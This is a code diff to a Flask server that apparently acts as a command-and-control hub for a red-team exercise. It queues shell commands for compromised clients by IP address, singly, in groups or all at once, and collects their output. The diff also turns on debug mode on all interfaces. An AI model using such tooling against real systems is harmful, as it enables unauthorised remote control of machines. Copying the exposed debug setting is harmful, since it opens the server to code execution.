@@ -14,8 +14,9 @@ print("Drew was here")
 # feedback:
 # something something default route
 # document what im gonna send in input-command
+# fix groups to be based on last TWO octets (line 98)
 
-client_commands = {} # 'client_id': 'command', 'timestamp' --> to handle commands for specific clients
+client_commands = {} # 'client_id': 'command', 'timestamp', 'output (default none)' --> to handle commands for specific clients
 clients = [] # just to see what clients we got rn
 groups = {} # for same box diff teams
 
@@ -32,12 +33,12 @@ def input():
         target, cmd = command_input.split(maxsplit=1) # splits it at only first occurrence of whitespace. so fire
         if target == "all":
             for c in clients:
-                client_commands[c] = {'command': cmd, 'timestamp': datetime.now()}
+                client_commands[c] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
         elif target in groups:
             for c in groups[target]:
-                client_commands[c] = {'command': cmd, 'timestamp': datetime.now()}
+                client_commands[c] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
         else: # 1 specific client
-            client_commands[target] = {'command': cmd, 'timestamp': datetime.now()}
+            client_commands[target] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
     except ValueError:
         return render_template('home.html', message="invalid input")
     return render_template('home.html', message=f"command for {target}: {cmd}")
@@ -77,40 +78,28 @@ def register_client():
         client_commands[client_id] = {"command": None, "timestamp": datetime.min}
     return jsonify(status="client registered", client_id=client_id)
 
-command_results = {}  # 'client_id': 'result'
-
 @app.route('/', methods=['POST']) # callbacks
 def command_result():
     client_id = request.args.get('client_id')
     result = request.json.get('result') # GET from client
     # wtf is a result rename that
     status = request.args.get('status')
-    command_results[client_id] = result
+    client_commands[client_id]['output'] = result
     print(colored("\nclient command result:\n" + result + "\n", "blue"))
     return jsonify({"status": status})
 
 @app.route('/callbacks', methods=['GET'])
 def callbacks():
     toRet = {}
-    # for group in groups:
-    #     toRet[group] = []
-    return {
-        "example-group": [{"192.168.1.20": ["command1", "command2", "command3"]}, {"192.168.2.20": ["command1", "command2", "command3"]}],
-        "example-group-2": ["192.168.1.90", "192.168.2.90"]
-    }
-    '''
     for group in groups:
-        add group as a key in toRet
-        for the value, make a list
-        for thing in client_commands: ('client_id': 'command', 'timestamp')
-            add thing to list
-    '''
-
-    # group_result = {}
-    # for group, clients in groups.items():
-    #     group_result[group] = [command_results.get(client_id, "nothign yet") for client_id in clients]
-    # return render_template('callbacks.html', group_result=group_result)
-
+        toRet[group] = []
+        for item in client_commands: # item = 'client_id': 'command', 'timestamp'
+            # check to put IP in correct group
+            if item.split(".")[3] == group: # need to parse the last octet of client_id in item for check
+                fuck = {}
+                fuck[item] = client_commands[item]
+                toRet[group].append(fuck)
+    return toRet
 
 @app.route('/clients')
 def show_clients():
@@ -130,5 +119,5 @@ def sendUpdate(ips, name="leahfr"):
         return False
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5005, threaded=True)
+    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
     # app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)
